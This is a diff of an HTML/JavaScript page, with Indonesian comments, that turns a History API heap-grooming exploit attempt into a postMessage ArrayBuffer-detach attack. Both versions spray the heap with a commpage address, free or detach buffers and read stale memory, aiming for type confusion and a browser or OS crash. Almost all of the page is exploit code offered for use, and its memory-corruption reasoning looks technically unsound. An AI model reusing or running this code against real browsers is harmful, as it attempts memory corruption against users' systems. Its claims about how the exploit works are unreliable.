@@ -1,27 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>History API State Corruption V4 (SAB Heap Grooming)</title>
+    <title>PostMessage ArrayBuffer Detach (Type Confusion)</title>
 </head>
 <body>
 
-    <h1>History API State Corruption V4 (SAB Heap Grooming)</h1>
-    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan SAB Heap Grooming...</p>
+    <h1>PostMessage Detach Type Confusion (Final Attack)</h1>
+    <p>Target Commpage Address (32-bit): 0x0FFFFFC320</p>
+    <p id="status">INIT: Mempersiapkan PostMessage Detach Race...</p>
     <div id="log-area"></div>
 
     <script>
         // --- KONSTANTA COMM PAGE ---
         const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
         const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
-        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
+        const TARGET_LENGTH_VALUE = Number(COMM_PAGE_ASB_TARGET_OFFSET); // Gunakan Offset 0x320 sebagai nilai 32-bit
         
-        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
-        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
+        const LOW_WORD = Number(COMM_PAGE64_BASE_ADDRESS & 0xFFFFFFFFn) + TARGET_LENGTH_VALUE; // Commpage Address Low Word
+        const HIGH_WORD = Number(COMM_PAGE64_BASE_ADDRESS >> 32n);
 
         let startTime = performance.now();
         let payloadHolders = []; 
-        let sabList = []; // Daftar SAB untuk grooming
+        let victimArray = null;
 
         function log(message, type = 'log-info') {
             const timeElapsed = (performance.now() - startTime).toFixed(2);
@@ -30,99 +30,83 @@
             logElement.scrollTop = logElement.scrollHeight;
         }
 
-        // --- FUNGSI HEAP SPRAY PAYLOAD (Menggunakan Float64Array) ---
+        // --- FUNGSI HEAP SPRAY PAYLOAD (Targeting 32-bit fields) ---
         function sprayPayload() {
-            log("Memulai Spraying Payload SINKRON (Float64Array)...", "log-spray");
-            const SPRAY_COUNT = 3000; 
-            const PAYLOAD_SIZE = 64; 
+            log("Memulai Spraying Payload (32-bit)...", "log-spray");
+            const SPRAY_COUNT = 3000;
+            const PAYLOAD_SIZE = 100; 
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
-                let payloadArray = new Float64Array(PAYLOAD_SIZE);
-                payloadArray[0] = HIGH_WORD; 
-                payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 2033.0 + i; 
+                let payloadArray = new Uint32Array(PAYLOAD_SIZE);
+                // Tempatkan LOW_WORD (Commpage Address) di tengah array
+                payloadArray[5] = LOW_WORD; 
+                payloadArray[6] = 0x41414141; 
                 payloadHolders.push(payloadArray); 
             }
         }
 
         // --- FUNGSI UTAMA ATTACK ---
-        function runHistoryAttack() {
+        function runDetachAttack() {
             startTime = performance.now();
-            log("Phase 1: History Grooming dengan SharedArrayBuffer.", "log-init");
+            log("Phase 1: Membuat Array Korban dan Array Buffer.", "log-init");
 
-            const HISTORY_COUNT = 100;
-            const SAB_SIZE = 4096; // 4KB (Ukuran yang sering digunakan oleh slab allocator)
+            const BUFFER_SIZE = 1024 * 1024; // 1MB Buffer
+            let victimBuffer = new ArrayBuffer(BUFFER_SIZE);
+            // Victim Array (View) tetap berada di thread utama
+            victimArray = new Uint32Array(victimBuffer);
+            victimArray.fill(0xBABEBABE);
             
-            // 1. Grooming Heap dengan SAB dan pushState
-            for (let i = 0; i < HISTORY_COUNT; i++) {
-                let sab = new SharedArrayBuffer(SAB_SIZE);
-                let sabView = new Uint32Array(sab);
-                sabView[0] = 0xDEADBEEF + i; // Nilai penanda
-                
-                // Gunakan pushState. Ini menyimpan pointer/header SAB di History Cache C++
-                window.history.pushState({ id: i, data: sab }, `SAB State ${i}`, `#step${i}`);
-                sabList.push(sab); // Simpan referensi SAB
-            }
-            log(`Phase 2: ${HISTORY_COUNT} SAB diserialisasi dan disimpan.`, "log-info");
-            
-            // 2. Navigasi Cepat (FREE C++)
-            window.history.go(-HISTORY_COUNT); 
-            log("Phase 3: Navigasi ke state paling awal (FREE SAB Cache C++).", "log-critical");
+            // 1. FREE (Detach): Kirim ArrayBuffer ke dirinya sendiri (Window) sebagai Transferable
+            // Ini akan membuat victimBuffer menjadi 'detached' dan ArrayBuffer View C++ di belakang victimArray menjadi tidak valid.
+            window.postMessage({ cmd: 'detach', buffer: victimBuffer }, '*', [victimBuffer]);
+            log(`Phase 2: victimBuffer DITRANSFER (Detached). Length: ${victimBuffer.byteLength}`, "log-critical");
 
-            // 3. SPRAY SINKRON
-            // Kode ini dieksekusi tepat saat History Cache C++ me-free alokasi SAB-nya.
+            // 2. SPRAY SINKRON
+            // Kernel memori yang menyimpan buffer yang sudah detached/free harus segera ditimpa.
             sprayPayload(); 
-            log("Phase 4: SPRAY Commpage Payload SINKRON (Menimpa SAB Header).", "log-critical");
-
-            // 4. Trigger Implisit (Memaksa Pembacaan Cache Corrupt)
-            // Trigger 1: Replace State (Menulis ke lokasi yang baru di-spray)
-            let triggerSAB = new SharedArrayBuffer(SAB_SIZE);
-            window.history.replaceState({ trigger: triggerSAB }, 'Attack Trigger', '#final');
-            log("Phase 5: ReplaceState Trigger Aktif.", "log-critical");
+            log("Phase 3: SPRAY Commpage Payload SINKRON.", "log-critical");
             
-            // Trigger 2: Membaca data dari SAB yang seharusnya sudah di-free/corrupt
+            // 3. TRIGGER: Akses Victim Array yang seharusnya sudah tidak memiliki Buffer.
+            // Jika ArrayBuffer View C++ (yang ada di belakang victimArray) tidak diperbarui dengan benar, 
+            // array ini akan membaca dari memori yang baru di-spray.
+            
             setTimeout(() => {
-                log("Phase 6: Memicu Access ke SAB yang Corrupt...", "log-critical");
-                
-                // Akses array yang *kita simpan*, yang harusnya sekarang menunjuk ke Header SAB yang ditimpa
-                const victimSAB = sabList[sabList.length - 1]; // Ambil salah satu SAB dari list
-                if (victimSAB) {
-                    try {
-                        let victimView = new Float64Array(victimSAB); 
-                        
-                        // Baca alamat yang seharusnya ditimpa oleh Payload Commpage (HIGH_WORD / LOW_WORD)
-                        const readHigh = victimView[0];
-                        const readLow = victimView[1];
-                        
-                        log(`Nilai dibaca (High): 0x${readHigh.toString(16)}`, "log-critical");
-                        log(`Nilai dibaca (Low): 0x${readLow.toString(16)}`, "log-critical");
+                log("Phase 4: Memicu Access OOB pada Array yang Detached.", "log-critical");
 
-                        if (Math.floor(readHigh) === HIGH_WORD) {
-                            log("SUCCESS: Type Confusion / SAB Header Corrupt oleh Commpage!", "log-success");
-                        }
-                        
-                        // Final Trigger: Coba alokasi besar dengan nilai yang dibaca
-                        let finalArray = new Array(Math.floor(readLow) & 0xFFFF);
-                        finalArray.fill(0);
+                try {
+                    // Coba baca di index 5, yang seharusnya diisi oleh LOW_WORD di sprayPayload
+                    const OOB_INDEX = 5; 
+                    const crashValue = victimArray[OOB_INDEX]; 
+                    
+                    log(`Nilai dibaca: 0x${crashValue.toString(16)}`, "log-critical");
 
-                    } catch(e) {
-                        log(`JS Exception saat Trigger: ${e.message} - Menunggu Crash OS.`, "log-critical");
+                    // SUCCESS JIKA: crashValue == Commpage LOW_WORD
+                    if (crashValue === LOW_WORD) {
+                        log("SUCCESS: Detach/Type Confusion Berhasil! Commpage Address Ditemukan!", "log-success");
                     }
+
+                    // Trigger Final (Jika OOB Read berhasil): Paksa JIT crash dengan nilai yang dibaca
+                    let finalArray = new Array(crashValue & 0xFFFF);
+                    finalArray.fill(0);
+
+                } catch(e) {
+                     log(`JS Exception saat Trigger: ${e.message} - Menunggu Crash OS.`, "log-critical");
                 }
-            }, 100);
-            
-            // Hapus referensi untuk membantu GC membersihkan SAB
-            sabList = null;
+
+            }, 50);
         }
         
+        // Listener untuk menangkap hasil PostMessage (tidak melakukan apa-apa selain membersihkan)
+        window.onmessage = function(e) {
+            if (e.data && e.data.cmd === 'detach') {
+                log("PostMessage diterima. Transfer Buffer Selesai.", "log-info");
+            }
+        };
+
         document.addEventListener('DOMContentLoaded', () => {
-             if (!window.SharedArrayBuffer) {
-                 document.getElementById('status').textContent = 'Gagal: SharedArrayBuffer tidak didukung.';
-                 return;
-             }
-            document.getElementById('status').textContent = 'Memulai rangkaian History API V4...';
-            setTimeout(runHistoryAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah SAB Heap Grooming.';
+            document.getElementById('status').textContent = 'Memulai rangkaian PostMessage Detach Attack...';
+            setTimeout(runDetachAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Type Confusion.';
         });
     </script>
     <style>
